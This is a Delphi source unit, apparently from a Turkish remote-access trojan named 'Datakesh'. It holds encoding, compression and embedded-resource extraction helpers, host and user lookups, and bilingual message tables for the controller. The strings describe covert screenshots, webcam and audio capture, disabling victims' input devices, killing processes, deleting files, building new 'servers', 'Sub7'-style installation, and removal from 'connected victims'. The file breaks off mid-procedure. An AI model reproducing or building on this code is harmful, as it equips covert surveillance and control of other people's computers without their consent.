unit psyapi;

interface

procedure kaydet(yazilasi,nereye:string);
function Decode64(S: string): string;
function Encode64(S: string): string;
procedure lhac(gir,cik:string);
function PlayWavFile(const FileName: string): Boolean;
procedure PrintInCoordinate(Text:string; x,y,boyut,renk,arka:Integer;merkez:string);
function parcala(const s: string; wordIndex: integer): string;
function cins(dosya:string):integer;
function hddturu(hede,cins:string) : integer;
function hesapla(sure:integer): string;
function mturu(hede:string) : string;
function hocayadanis(mevzu:string) : string;
function makine : string;
function kullanici : Ansistring;
function xGetFileSize(FileName: String): Int64;
procedure LoadServer(Fname:string;var FullContents:string);
procedure Extract(Path:String;cikartilacak:string);
function GetTempDir: string;
function kuryorumla(hede:string) : string;
PROCEDURE inkilisce;
procedure turkce;
procedure diloku;
procedure sikistir(gir,cik:string);
procedure yerlimesaj;
procedure ecnebimesaj;
function boyutyorumla(hede:string):String;
const
ayardosyasi = 'ayar.dat';
Codes64 = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/';

var
eskidil : array[0..155] of string;

implementation

uses
windows,
classes,
mmsystem,
graphics,
unit1,
unit2,
lh5unit,
winsock,
sysutils;

function boyutyorumla(hede:string):String;
var
db,db2:int64;
begin
result:='';
db:=strtoint64(hede);

if DB < 1024 then begin
result:=inttostr((DB))+' bayt';
exit
end;

if DB > 1048576 * 1024 then begin
db2:=db div 1024 div 1024;
result:=inttostr(DB div 1024 div 1024 div 1024)+','+copy(inttostr(db2 mod 1024),1,1)+' gb';
exit
end;

if DB > 1048576 then begin
db2:=db div 1024;
result:=inttostr(DB div 1024 div 1024)+','+copy(inttostr(db2 mod 1024),1,1)+' mb';
exit
end;

Result:=inttostr(DB div 1024)+' kb';
end;

function kuryorumla(hede:string) : string;
var
str:string;
begin
hede:=decode64(hede);
if parcala(hede,0) = 'X' then str:='Registry,';
if parcala(hede,1) = 'X' then str:=str+'ActiveX,';
if parcala(hede,2) = 'X' then str:=str+'Sub7 Tarzý';
if str='' then result:='Kurulmamý$' else result:=str;
end;

procedure sikistir(gir,cik:string);
var
InStr, OutStr: TFileStream;
begin
try
InStr := TFileStream.Create(gir,fmOpenRead);
OutStr := TFileStream.Create(cik,fmCreate);
LHACompress(InStr, OutStr);
InStr.Free;
OutStr.Free;
except on exception do exit;
end;
end;

function GetTempDir: string;
var
  lng:     DWORD;
begin
  SetLength(Result, MAX_PATH);
  lng := GetTempPath(MAX_PATH, PChar(Result));
  SetLength(Result, lng);
end;

procedure Extract(Path:String;cikartilacak:string);
var
  ResourceLocation: HRSRC;
  ResourceSize, BytesWritten: Longword;
  ResDataHandle: THandle;
  FileHandle: THandle;
  ResourcePointer: pchar;
begin
ResourceLocation := FindResource(HInstance, pchar(cikartilacak), 'PSYCORE');
if ResourceLocation <> 0 then
  begin
  ResourceSize := SizeofResource(HInstance, ResourceLocation);
    if ResourceSize <> 0 then
    begin
    ResDataHandle := LoadResource(HInstance, ResourceLocation);
      if ResDataHandle <> 0 then
      begin
      ResourcePointer := LockResource(ResDataHandle);
        if ResourcePointer <> nil then
        begin
        FileHandle := CreateFile(PChar(Path), GENERIC_WRITE, FILE_SHARE_WRITE, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
          if FileHandle <> INVALID_HANDLE_VALUE then
          begin
          WriteFile(FileHandle, ResourcePointer^, ResourceSize, BytesWritten, nil);
          CloseHandle(FileHandle);
          end;
        end;
      end;
    end;
  end;
end;

procedure LoadServer(Fname:string;var FullContents:string);
var
 Fcontents:File of Char;
 Fbuffer:array [1..1024] of Char;
 rLen,Fsize:LongInt;
begin
 FullContents:='';
 {$I-} (* ignore IO errors .. just quietly exit *)
 AssignFile(Fcontents,Fname);
 Reset(Fcontents);
 Fsize:=FileSize(Fcontents);
 while not Eof(Fcontents) do begin
  BlockRead(Fcontents,Fbuffer,1024,rLen);
  FullContents:=FullContents + string(Fbuffer);
 end;
 CloseFile(Fcontents);
 {$I+}
 if Length(FullContents) > Fsize then
  FullContents:=Copy(FullContents,1,Fsize);
end;

function xGetFileSize(FileName: String): Int64;
Var
  H: THandle;
  fData: tWin32FindData;
Begin
  Result := -1;
  H := FindFirstFile(pChar(FileName), fData);
  If H <> INVALID_HANDLE_VALUE Then
  Begin
    Windows.FindClose(H);
    Result := Int64(fData.nFileSizeHigh) shl 32 + fData.nFileSizeLow;
  End;
End;

function kullanici : Ansistring;
var
  dwI : DWord;
begin
  dwI := MAX_PATH;
  SetLength (Result, dwI + 1);
  if WNetGetUser (Nil, PChar (Result), dwI) = NO_ERROR then
    SetLength (Result, StrLen (PChar (Result)))
  else
    SetLength (Result, 0)
end;

function makine : string;
var
  Makine_ismi:array[0..255] of char;
  BufferSize:DWORD;
begin
  BufferSize:=SizeOf(Makine_ismi);
  GetComputerName(@Makine_ismi,BufferSize);
 result:= Makine_ismi;
end;

function hocayadanis(mevzu:string) : string;
begin
result:=mevzu;
if mevzu='?' then result:='Bilinmiyor';
if mevzu='???' then result:='Bilinmiyor';
if mevzu='ACG' then result:='AC Baglanti';
if mevzu='PIL' then result:='Pil';
if mevzu='1' then result:='Tamam';
if mevzu='2' then result:='Iptal';
if mevzu='6' then result:='Evet';
if mevzu='7' then result:='Hayýr';
if mevzu='4' then result:='Yeniden Dene';
end;

function mturu(hede:string) : string;
begin
result:='Bilinmeyen Aygýt';
case strtoint(hede) of
0: result:='Bilinmeyen Aygýt';
1: result:='Kullanýlamaz Aygýt';
2: result:='Çýkarýlabilir Disk';
3: result:='CD-ROM';
4: result:='Harddisk';
5: result:='Ag Baglantisi';
6: result:='Ramdisk';
end;
end;

function hesapla(sure:integer): string;
const
  ticksperday: Integer    = 1000 * 60 * 60 * 24;
  ticksperhour: Integer   = 1000 * 60 * 60;
  ticksperminute: Integer = 1000 * 60;
  tickspersecond: Integer = 1000;
var
  t:Longword;
  d, h, m, s: Integer;
begin
  t := sure;
  d := t div ticksperday;
  Dec(t, d * ticksperday);
  h := t div ticksperhour;
  Dec(t, h * ticksperhour);
  m := t div ticksperminute;
  Dec(t, m * ticksperminute);
  s := t div tickspersecond;
  Result := IntToStr(d) + ' Gün ' + IntToStr(h) + ' Saat ' + IntToStr(m) +' Dakika ' + IntToStr(s) + ' Saniye';
end;

function hddturu(hede,cins:string) : integer;
begin
result:=16;
if cins= '0' then result:=16;
if cins= '1' then result:=16;
if cins= '2' then result:=21;
if hede= 'A:\' then result:=18;
if hede= 'B:\' then result:=18;
if cins= '3' then result:=17;
if cins= '4' then result:=22;
if cins= '5' then result:=19;
if cins= '6' then result:=20;
end;

function cins(dosya:string):integer;
begin
result:=1;
if uppercase(extractfileext(dosya)) = '.EXE' then result:=2;
if uppercase(extractfileext(dosya)) = '.GIF' then result:=3;
if uppercase(extractfileext(dosya)) = '.JPG' then result:=4;
if uppercase(extractfileext(dosya)) = '.RTF' then result:=5;
if uppercase(extractfileext(dosya)) = '.DOC' then result:=5;
if uppercase(extractfileext(dosya)) = '.TXT' then result:=6;
if uppercase(extractfileext(dosya)) = '.LOG' then result:=6;
if uppercase(extractfileext(dosya)) = '.BMP' then result:=7;
if uppercase(extractfileext(dosya)) = '.MPG' then result:=8;
if uppercase(extractfileext(dosya)) = '.MPE' then result:=8;
if uppercase(extractfileext(dosya)) = '.AVI' then result:=8;
if uppercase(extractfileext(dosya)) = '.3GP' then result:=8;
if uppercase(extractfileext(dosya)) = '.MPEG' then result:=8;
if uppercase(extractfileext(dosya)) = '.WMV' then result:=8;
if uppercase(extractfileext(dosya)) = '.ASF' then result:=8;
if uppercase(extractfileext(dosya)) = '.MP3' then result:=9;
if uppercase(extractfileext(dosya)) = '.AMR' then result:=9;
if uppercase(extractfileext(dosya)) = '.WAV' then result:=9;
if uppercase(extractfileext(dosya)) = '.MP2' then result:=9;
if uppercase(extractfileext(dosya)) = '.WMA' then result:=9;
if uppercase(extractfileext(dosya)) = '.DLL' then result:=10;
if uppercase(extractfileext(dosya)) = '.SYS' then result:=10;
if uppercase(extractfileext(dosya)) = '.VXD' then result:=10;
if uppercase(extractfileext(dosya)) = '.INI' then result:=10;
if uppercase(extractfileext(dosya)) = '.DB' then result:=10;
if uppercase(extractfileext(dosya)) = '.OCX' then result:=10;
if uppercase(extractfileext(dosya)) = '.HTM' then result:=11;
if uppercase(extractfileext(dosya)) = '.HTML' then result:=11;
if uppercase(extractfileext(dosya)) = '.CHM' then result:=11;
if uppercase(extractfileext(dosya)) = '.MHT' then result:=11;
if uppercase(extractfileext(dosya)) = '.RAR' then result:=12;
if uppercase(extractfileext(dosya)) = '.7z' then result:=12;
if uppercase(extractfileext(dosya)) = '.ACE' then result:=12;
if uppercase(extractfileext(dosya)) = '.ZIP' then result:=13;
if uppercase(extractfileext(dosya)) = '.Z' then result:=13;
if uppercase(extractfileext(dosya)) = '.XLS' then result:=14;
if uppercase(extractfileext(dosya)) = '.XLW' then result:=14;
if uppercase(extractfileext(dosya)) = '.BAT' then result:=15;
if uppercase(extractfileext(dosya)) = '.CMD' then result:=15;
end;

function parcala(const s: string; wordIndex: integer): string;
var
  index, counter: integer;
begin
  result:= trim(s); //result equals the string you entered
  counter := 0; //counter starts at 0
  index := Pos('||', result); //if there are 2 spaces by each other
   while index > 0 do //while its true theres more then 1 space by each other
  begin
   Delete(result, index, 1); //delete one of the spaces
   index := Pos('||', result); //check the string again for double spaces
  end;
  //Now there are no spaces next to each other we can continue ;)
  index := Pos('|', result); //get the position of the first word
    while ((counter < wordIndex) and (index > 0)) do //while counter is less then wordindex and there are more words countinue
  begin
    Delete(result, 1, index); //delete all characters from the beginning index to the space to the next word
    index := Pos('|', result); //check if there any more words in the string by looking for spaces

    counter := counter + 1; //increment the counter by one
  end;

  if (counter < wordIndex) then //if were not enough words in your search return a blank string
    result:= '';

  index := Pos('|', result); //check if there are more words after your word
  if index > 0 then  //if there are more words
    Delete(result, index, maxInt);// start at the space then delete all the words after the space maxInt is the largest number a integer will go by
end;

procedure PrintInCoordinate(Text:string; x,y,boyut,renk,arka:Integer;merkez:string);
var
   CrLf,cLine:string;
   c,LineH,p:LongInt;
   Dc:HDC;
   ortasi:integer;
begin
try
  CrLf:=#13#10;
   c:=0;
   Dc:=GetWindowDc(GetDesktopWindow);
   with TCanvas.Create do
   begin
      Handle:=Dc;
      Font.Size:=boyut;
      Font.Color:=renk;
      font.Name:='Verdana';
      Brush.Color:=arka;
      LineH:=TextHeight('H');
      p:=Pos(CrLf,Text);
      while p > 0 do
      begin
         cLine:=Copy(Text,1,p - 1);
         Text:=Copy(Text,p + Length(CrLf),Length(Text));
         TextOut(X,Y + (c * LineH),cLine);
         c:=c + 1;
         p:=Pos(CrLf,Text);
      end;

      if merkez='X' then begin
      ortasi:=textwidth(text) div 2;
      x:=GetSystemMetrics(SM_CXSCREEN) div 2 - ortasi;
      y:=GetSystemMetrics(SM_CYSCREEN) div 2 - TextHeight('H')
      end;

      TextOut(X,Y + (c * LineH),Text);
      Free;
   end;
except
on Exception do exit
end;
end;

function PlayWavFile(const FileName: string): Boolean;
begin
Result := PlaySound(PChar(FileName), 0, SND_RESOURCE or SND_ASYNC);
end;

procedure lhac(gir,cik:string);
var
InStr, OutStr: TFileStream;
begin
try
InStr := TFileStream.Create(gir,fmOpenRead);
OutStr := TFileStream.Create(cik,fmCreate);
LHAexpand(InStr, OutStr);
InStr.Free;
OutStr.Free;
except on exception do exit;
end;
end;

function Encode64(S: string): string;
var
  i: Integer;
  a: Integer;
  x: Integer;
  b: Integer;
begin
  Result := '';
  a := 0;
  b := 0;
  for i := 1 to Length(s) do
  begin
    x := Ord(s[i]);
    b := b * 256 + x;
    a := a + 8;
    while a >= 6 do
    begin
      a := a - 6;
      x := b div (1 shl a);
      b := b mod (1 shl a);
      Result := Result + Codes64[x + 1];
    end;
  end;
  if a > 0 then
  begin
    x := b shl (6 - a);
    Result := Result + Codes64[x + 1];
  end;
end;

function Decode64(S: string): string;
var
  i: Integer;
  a: Integer;
  x: Integer;
  b: Integer;
begin
  Result := '';
  a := 0;
  b := 0;
  for i := 1 to Length(s) do
  begin
    x := Pos(s[i], codes64) - 1;
    if x >= 0 then
    begin
      b := b * 64 + x;
      a := a + 6;
      if a >= 8 then
      begin
        a := a - 8;
        x := b shr a;
        b := b mod (1 shl a);
        x := x mod 256;
        Result := Result + chr(x);
      end;
    end
    else
      Exit;
  end;
end;

procedure ecnebimesaj;
begin
form1.cmesaj[0]:='Connection Attempt : ';
form1.cmesaj[1]:='Verified';
form1.cmesaj[2]:='Checksum fail';
form1.cmesaj[3]:='Timeout';
form1.cmesaj[4]:='Cancelled';
form1.cmesaj[5]:='Receiving Packet';
form1.cmesaj[6]:='OK';
form1.cmesaj[7]:='Ready..';
form1.cmesaj[8]:='New Connection: ';
form1.cmesaj[9]:=' on ';
form1.cmesaj[10]:='Wrong Pass, Connection closed ';
form1.cmesaj[11]:='File CRC Fail : ';
form1.cmesaj[12]:='User On Pc';
form1.cmesaj[13]:='User On pc Now..';
form1.cmesaj[14]:='Active Conn. : ';
form1.cmesaj[15]:='Program Error On Remote Side..';
form1.cmesaj[16]:='Text already on screen..';
form1.cmesaj[17]:='Sending File.';
form1.cmesaj[18]:='Connecting : ';
form1.cmesaj[19]:='Sending File..';
form1.cmesaj[20]:='Connected, Sending File..';
form1.cmesaj[21]:='File Sent : ';
form1.cmesaj[22]:='Conn. Error : ';
form1.cmesaj[23]:='Error!';
form1.cmesaj[24]:='File Not Found :';
form1.cmesaj[25]:='Downloading File : ';
form1.cmesaj[26]:='File Downloaded on remote side..';
form1.cmesaj[27]:='File Downloaded : ';
form1.cmesaj[28]:='End of command..';
form1.cmesaj[29]:='Window Tracking ended..';
form1.cmesaj[30]:='Conn. Timeout : ';
form1.cmesaj[31]:='Local Security Error : ';
form1.cmesaj[32]:='Executed : ';
form1.cmesaj[33]:='Executed Program : ';
form1.cmesaj[34]:='Cannot Execute : ';
form1.cmesaj[35]:='Cannot Execute : ';
form1.cmesaj[36]:='Deleted Folder : ';
form1.cmesaj[37]:='Cannot Delete Folder : ';
form1.cmesaj[38]:='Deleted File : ';
form1.cmesaj[39]:='Cannot Delete : ';
form1.cmesaj[40]:='File(s) Copied : ';
form1.cmesaj[41]:='Cannot Copy : ';
form1.cmesaj[42]:='File Renamed : ';
form1.cmesaj[43]:='Cannot Open File : ';
form1.cmesaj[44]:='Dir not Found : ';
form1.cmesaj[45]:='Process Terminated : ';
form1.cmesaj[46]:='Cannot Terminate : ';
form1.cmesaj[47]:='Active dir : ';
form1.cmesaj[48]:='Active window : ';
form1.cmesaj[49]:='Taking Screenshot - Quality : ';
form1.cmesaj[50]:='Taking Webcam Shot - Quality : ';
form1.cmesaj[51]:='Sound Recording Complete - Size : ';
form1.cmesaj[52]:='Already recording..';
form1.cmesaj[53]:='Recording Sound - Time : ';
form1.cmesaj[54]:='Processing Command..';
form1.cmesaj[55]:='Terminating Datakesh Core..';
form1.cmesaj[56]:='Disconnecting..';
form1.cmesaj[57]:='Window Closed : ';
form1.cmesaj[58]:='Cannot Close : ';
form1.cmesaj[59]:='Done : ';
form1.cmesaj[60]:='Window Not found : ';
form1.cmesaj[61]:='Locked Window : ';
form1.cmesaj[62]:='Active Window : ';
form1.cmesaj[63]:='Input Devices Deactivated..';
form1.cmesaj[64]:='Input Devices Activated..';
form1.cmesaj[65]:='Text On Screen : ';
form1.cmesaj[66]:='Text On Screen (Const.) : ';
form1.cmesaj[67]:='Screen Cleared..';
form1.cmesaj[68]:='Label Changed : ';
form1.cmesaj[69]:='Cannot Change Label : ';
form1.cmesaj[70]:='Mouse Pos. Freezed..';
form1.cmesaj[71]:='Mouse Activated..';
form1.cmesaj[72]:='Program Blocking Already Set..';
form1.cmesaj[73]:='Blocked Program : ';
form1.cmesaj[74]:='Program Blocking Deactivated..';
form1.cmesaj[75]:='Window Tracking Already Set..';
form1.cmesaj[76]:='CD-ROM Tray Opened..';
form1.cmesaj[77]:='CD-ROM Tray Closed..';
form1.cmesaj[78]:='Unknown Command : ';
form1.cmesaj[79]:=' File(s) Deleted..';
form1.cmesaj[80]:='Sending Procedure Started..';
form1.cmesaj[81]:=' File(s) Sent..';
form1.cmesaj[82]:='Transmission interrupted..';
form1.cmesaj[83]:='Generating Picture Thumbnails - Quality : ';
form1.cmesaj[84]:='Wait While Previous Process end..';
form1.cmesaj[85]:='Wait..';
form1.cmesaj[86]:='Thumbnail Generation Complete..';
form1.cmesaj[87]:='Uninstalling Program From : ';
form1.cmesaj[88]:='Idle Warning Activated..';
form1.cmesaj[89]:='Main Program is Modified !';
form1.cmesaj[90]:='Ready..';
form1.cmesaj[91]:='Active Dir : ';
form1.cmesaj[92]:='Answer : ';
form1.cmesaj[93]:='Drive : ';
form1.cmesaj[94]:='Label : ';
form1.cmesaj[95]:='Filesystem : ';
form1.cmesaj[96]:='Dir : ';
form1.cmesaj[97]:='Size : ';
form1.cmesaj[98]:='Filie : ';
form1.cmesaj[99]:='Created : ';
form1.cmesaj[100]:='Modified : ';
form1.cmesaj[101]:='Accessed : ';
form1.cmesaj[102]:='Machine : ';
form1.cmesaj[103]:='User : ';
form1.cmesaj[104]:='Windows Version : ';
form1.cmesaj[105]:='Language : ';
form1.cmesaj[106]:='Original Name : ';
form1.cmesaj[107]:='Registered User : ';
form1.cmesaj[108]:='Registered Company : ';
form1.cmesaj[109]:='Resolution : ';
form1.cmesaj[110]:='Total Memory : ';
form1.cmesaj[111]:='Memory Status : %';
form1.cmesaj[112]:='Power Status : ';
form1.cmesaj[113]:='Battery Status : ';
form1.cmesaj[114]:='Uptime : ';
form1.cmesaj[115]:='Path : ';
form1.cmesaj[116]:='Installation Name : ';
form1.cmesaj[117]:='Reg. Name : ';
form1.cmesaj[118]:='Connection : ';
form1.cmesaj[119]:='Startup Method : ';
form1.cmesaj[120]:='Max Packet Size : ';
form1.cmesaj[121]:='Max Compression : ';
form1.cmesaj[122]:='Timeout : ';
form1.cmesaj[123]:='Connection interval : ';
form1.cmesaj[124]:='CRC32 : ';
form1.cmesaj[125]:='Processes:';
form1.cmesaj[126]:='Dir:';
form1.cmesaj[127]:='File:';
form1.cmesaj[128]:='No file';
form1.cmesaj[129]:=' File, ';
form1.cmesaj[130]:=' Dir';
form1.cmesaj[131]:='Drives:';
form1.cmesaj[132]:='Total ';
form1.cmesaj[133]:=' Drive';
form1.cmesaj[134]:='System Directories';
form1.cmesaj[135]:='Special Folders';
form1.cmesaj[136]:='Active Windows:';
form1.cmesaj[137]:='Total Windows : ';
form1.cmesaj[138]:='Exit : ';
form1.cmesaj[139]:='Listening External Ports : ';
form1.cmesaj[140]:='Waiting For Connection..';
form1.cmesaj[141]:='Msg : ';
form1.cmesaj[142]:='Size : ';
form1.cmesaj[143]:='Coordinates : ';
form1.cmesaj[144]:='Caption : ';
form1.cmesaj[145]:='Msg : ';
form1.cmesaj[146]:='Enter Parameter(s)..';
form1.cmesaj[147]:='Ready To use..';
form1.cmesaj[148]:='Socket Error, Check Connections..';
form1.cmesaj[149]:='Socket Changed : ';
form1.cmesaj[150]:='Disconnected : ';
form1.cmesaj[151]:='ScreenShot';
form1.cmesaj[152]:='Webcam Picture';
form1.cmesaj[153]:='Recording';
form1.cmesaj[154]:='New Process';
form1.cmesaj[155]:='Enter Full Path';
form1.cmesaj[156]:='OK';
form1.cmesaj[157]:='Error!';
form1.cmesaj[158]:='Size : ';
form1.cmesaj[159]:='Cancel';
form1.cmesaj[160]:='Enter New Caption..';
form1.cmesaj[161]:='Refresh Rate? (ms)';
form1.cmesaj[162]:='Delay ? (ms)';
form1.cmesaj[163]:='Local';
form1.cmesaj[164]:='Adress ?';
form1.cmesaj[165]:='Download To :';
form1.cmesaj[166]:='Not a Datakesh Server : ';
form1.cmesaj[167]:='Settings Loaded From : ';
form1.cmesaj[168]:='New Server Generated : ';
form1.cmesaj[169]:='Verify Action';
form1.cmesaj[170]:='Are You Sure?';
form1.cmesaj[171]:='WARNING !!'+ENT+ENT+'This will remove program from current connected victims.'+ENT+ENT+'Are You Sure?';
form1.cmesaj[172]:='Local Host: ';
form1.cmesaj[173]:='WAN Adress Received: ';
end;

procedure yerlimesaj;
begin
form1.cmesaj[0]:='Baglantý Giri$imi : ';
form1.cmesaj[1]:='Dogrulandý';
form1.cmesaj[2]:='Saglama yanlý$';
form1.cmesaj[3]:='Zaman a$ýmý';
form1.cmesaj[4]:='Iptal Edildi';
form1.cmesaj[5]:='Paket Alýnýyor';
form1.cmesaj[6]:='Tamam';
form1.cmesaj[7]:='Hazir..';
form1.cmesaj[8]:='Yeni Baglanti: ';
form1.cmesaj[9]:=' üzerinde ';
form1.cmesaj[10]:='Parola Yanlý$, Baglanti Kesildi ';
form1.cmesaj[11]:='Dosya Dogrulanamadý : ';
form1.cmesaj[12]:='Kullanici Pc Ba$ýnda';
form1.cmesaj[13]:='Kullanici Bilgisayar Ba$ýnda..';
form1.cmesaj[14]:='Aktif Baglanti : ';
form1.cmesaj[15]:='Kar$i Tarafta Program Hatasi olu$tu..';
form1.cmesaj[16]:='Ekranda Zaten Yazý Mevcut..';
form1.cmesaj[17]:='Dosya Gönderiliyor.';
form1.cmesaj[18]:='Baglaniyor : ';
form1.cmesaj[19]:='Dosya Gönderiliyor..';
form1.cmesaj[20]:='Baglandi, Dosya Gönderiliyor..';
form1.cmesaj[21]:='Dosya Gönderildi : ';
form1.cmesaj[22]:='Baglanti Hatasý : ';
form1.cmesaj[23]:='Hata!';
form1.cmesaj[24]:='Dosya Bulunamadi :';
form1.cmesaj[25]:='Dosya indiriliyor : ';
form1.cmesaj[26]:='Kar$ýda Dosya Indirildi..';
form1.cmesaj[27]:='Dosya indirildi : ';
form1.cmesaj[28]:='Komut Sonu..';
form1.cmesaj[29]:='Pencere izleme Kapatýldý..';
form1.cmesaj[30]:='Baglantý Zamana$ýmý : ';
form1.cmesaj[31]:='Yerel Güvenlik Hatasý : ';
form1.cmesaj[32]:='Çalý$týrýldý : ';
form1.cmesaj[33]:='Program Çalý$týrýldý : ';
form1.cmesaj[34]:='Çalý$týrýlamadý : ';
form1.cmesaj[35]:='Program Çalý$týrýlamadý : ';
form1.cmesaj[36]:='Klasör Silindi : ';
form1.cmesaj[37]:='Klasör Silinemedi : ';
form1.cmesaj[38]:='Dosya Silindi : ';
form1.cmesaj[39]:='Dosya Silinemedi : ';
form1.cmesaj[40]:='Dosya Kopyalandý : ';
form1.cmesaj[41]:='Dosya Kopyalanamadý : ';
form1.cmesaj[42]:='Dosya Adý Degi$tirildi : ';
form1.cmesaj[43]:='Dosya açýlamadý : ';
form1.cmesaj[44]:='Dizin Bulunamadý : ';
form1.cmesaj[45]:='Iþlem Sonlandýrýldý : ';
form1.cmesaj[46]:='Program Kapatýlamadý : ';
form1.cmesaj[47]:='Aktif Dizin : ';
form1.cmesaj[48]:='Aktif Pencere : ';
form1.cmesaj[49]:='Ekran Görüntüsü Alýnýyor - Kalite : ';
form1.cmesaj[50]:='Webcam Görüntüsü Alýnýyor - Kalite : ';
form1.cmesaj[51]:='Ses Kaydý Tamamlandý - Boyut : ';
form1.cmesaj[52]:='Hala Ses Kaydediyor..';
form1.cmesaj[53]:='Ses Kaydý Alýnýyor - Süre : ';
form1.cmesaj[54]:='Komut i$leniyor..';
form1.cmesaj[55]:='Ana Program Kapatiliyor..';
form1.cmesaj[56]:='Baglantý Kesiliyor..';
form1.cmesaj[57]:='Pencere Kapatýldý : ';
form1.cmesaj[58]:='Pencere Kapatýlamadý : ';
form1.cmesaj[59]:='I$lem Tamam : ';
form1.cmesaj[60]:='Pencere Bulunamadý : ';
form1.cmesaj[61]:='Kilitlenen Pencere : ';
form1.cmesaj[62]:='Aktif Pencere : ';
form1.cmesaj[63]:='Giri$ Aygýtlarý Devre Dý$ý..';
form1.cmesaj[64]:='Giri$ Aygýtlarý Aktif..';
form1.cmesaj[65]:='Ekrana Yazýlan : ';
form1.cmesaj[66]:='Ekrana Yazýlan (Kalýcý) : ';
form1.cmesaj[67]:='Kullanýcý Ekraný Temizlendi..';
form1.cmesaj[68]:='Etiket Degi$tirildi : ';
form1.cmesaj[69]:='Etiket Degi$tirilemedi : ';
form1.cmesaj[70]:='Fare Kilitlendi..';
form1.cmesaj[71]:='Fare Aktif..';
form1.cmesaj[72]:='Program Engeli Zaten Açýk..';
form1.cmesaj[73]:='Engellenen Program : ';
form1.cmesaj[74]:='Program Engeli Kaldýrýldý..';
form1.cmesaj[75]:='Pencere izleme Zaten Aktif..';
form1.cmesaj[76]:='CD-ROM Kapaðý Açýldý..';
form1.cmesaj[77]:='CD-ROM Kapaðý Kapatýldý..';
form1.cmesaj[78]:='Bilinmeyen Komut : ';
form1.cmesaj[79]:=' dosya silindi..';
form1.cmesaj[80]:='Aktarým Ba$ladý..';
form1.cmesaj[81]:=' dosya gönderildi..';
form1.cmesaj[82]:='Aktarým iptal edildi..';
form1.cmesaj[83]:='Resim Önizlemeleri Olu$turuluyor - Kalite : ';
form1.cmesaj[84]:='Önceki i$lem Devam ediyor..';
form1.cmesaj[85]:='Önizleme Olu$turma Devam Ediyor..';
form1.cmesaj[86]:='Önizleme Olu$turma Tamamlandý..';
form1.cmesaj[87]:='Program Sistemden Kaldýrýlýyor : ';
form1.cmesaj[88]:='Idle Uyarýsý Aktif..';
form1.cmesaj[89]:='Program Modifiye Edilmi$!';
form1.cmesaj[90]:='Hazir..';
form1.cmesaj[91]:='Aktif Dizin : ';
form1.cmesaj[92]:='ileti Yanýtý : ';
form1.cmesaj[93]:='Sürücü : ';
form1.cmesaj[94]:='Etiket : ';
form1.cmesaj[95]:='Dosya Sistemi : ';
form1.cmesaj[96]:='Klasör : ';
form1.cmesaj[97]:='Boyut : ';
form1.cmesaj[98]:='Dosya : ';
form1.cmesaj[99]:='Olu$turma : ';
form1.cmesaj[100]:='Degi$tirme : ';
form1.cmesaj[101]:='Eri$im : ';
form1.cmesaj[102]:='Bilgisayar : ';
form1.cmesaj[103]:='Kullanýcý : ';
form1.cmesaj[104]:='Windows Sürümü : ';
form1.cmesaj[105]:='Dil : ';
form1.cmesaj[106]:='Orjinal ismi : ';
form1.cmesaj[107]:='Kayýtlý Kullanýcý : ';
form1.cmesaj[108]:='Kayýtlý Firma : ';
form1.cmesaj[109]:='Çözünürlük : ';
form1.cmesaj[110]:='Toplam Bellek : ';
form1.cmesaj[111]:='Ram Durumu : %';
form1.cmesaj[112]:='Güç Beslemesi : ';
form1.cmesaj[113]:='Batarya Durumu : ';
form1.cmesaj[114]:='Calisma Süresi : ';
form1.cmesaj[115]:='Program : ';
form1.cmesaj[116]:='Kurulum adý : ';
form1.cmesaj[117]:='Anahtar Kaydi : ';
form1.cmesaj[118]:='Baglanti : ';
form1.cmesaj[119]:='Kurulum Yöntemi : ';
form1.cmesaj[120]:='Max Paket Boyutu : ';
form1.cmesaj[121]:='Max Dosya Sýký$týrma : ';
form1.cmesaj[122]:='Zamana$ýmý : ';
form1.cmesaj[123]:='Baðlantý Denetleme : ';
form1.cmesaj[124]:='CRC32 : ';
form1.cmesaj[125]:='islem sayisi:';
form1.cmesaj[126]:='Klasör:';
form1.cmesaj[127]:='Dosya:';
form1.cmesaj[128]:='Dizin Bo$';
form1.cmesaj[129]:=' Dosya, ';
form1.cmesaj[130]:=' Klasör';
form1.cmesaj[131]:='Sürücüler:';
form1.cmesaj[132]:='Toplam ';
form1.cmesaj[133]:=' Sürücü';
form1.cmesaj[134]:='Sistem Dizinleri';
form1.cmesaj[135]:='Özel Klasörler';
form1.cmesaj[136]:='Aktif Pencereler:';
form1.cmesaj[137]:='Toplam Pencere : ';
form1.cmesaj[138]:='Çýký$ : ';
form1.cmesaj[139]:='Dinlenen Harici Portlar : ';
form1.cmesaj[140]:='Baðlantý Bekleniyor..';
form1.cmesaj[141]:='ileti : ';
form1.cmesaj[142]:='Boyut : ';
form1.cmesaj[143]:='Koordinatlar : ';
form1.cmesaj[144]:='Ba$lýk : ';
form1.cmesaj[145]:='ileti : ';
form1.cmesaj[146]:='Parametre(leri) girin..';
form1.cmesaj[147]:='Kullanýma Hazýr..';
form1.cmesaj[148]:='Soket Arýzasý, Baglantýlarý Kontrol et';
form1.cmesaj[149]:='Baglanti Degi$tirildi : ';
form1.cmesaj[150]:='Baglanti Kesildi : ';
form1.cmesaj[151]:='Ekran Görüntüsü';
form1.cmesaj[152]:='Webcam Görüntüsü';
form1.cmesaj[153]:='Ses Kaydý';
form1.cmesaj[154]:='Yeni i$lem';
form1.cmesaj[155]:='Tam yolu gir';
form1.cmesaj[156]:='Tamam';
form1.cmesaj[157]:='Hata!';
form1.cmesaj[158]:='Boyut : ';
form1.cmesaj[159]:='Iptal';
form1.cmesaj[160]:='Yeni Ba$ligi Gir..';
form1.cmesaj[161]:='Yenileme Oraný? (ms)';
form1.cmesaj[162]:='Gecikme ? (ms)';
form1.cmesaj[163]:='Yerel';
form1.cmesaj[164]:='Adres ?';
form1.cmesaj[165]:='Nereye ?';
form1.cmesaj[166]:='Gecersiz Dosya : ';
form1.cmesaj[167]:='Yüklenen Dosya : ';
form1.cmesaj[168]:='Yeni Server Olu$turuldu : ';
form1.cmesaj[169]:='i$lemi onayla';
form1.cmesaj[170]:='Eminmisin?';
form1.cmesaj[171]:='UYARI !!'+ENT+ENT+'Bu i$lem programi $u an bagli olan tüm kullanicilarin sisteminden kaldirir.'+ENT+ENT+'Eminmisin?';
form1.cmesaj[172]:='Yerel Adres: ';
form1.cmesaj[173]:='WAN Adresi Alýndý: ';
form1.cmesaj[174]:='WAN Adresi Alýnamadý! ';
end;

procedure inkilisce;
begin
form1.flatbutton39.caption:='Console';
form1.balanti:='Connections';
form1.kasinti:='File Transfers';
form1.flatbutton33.caption:='File Manager';
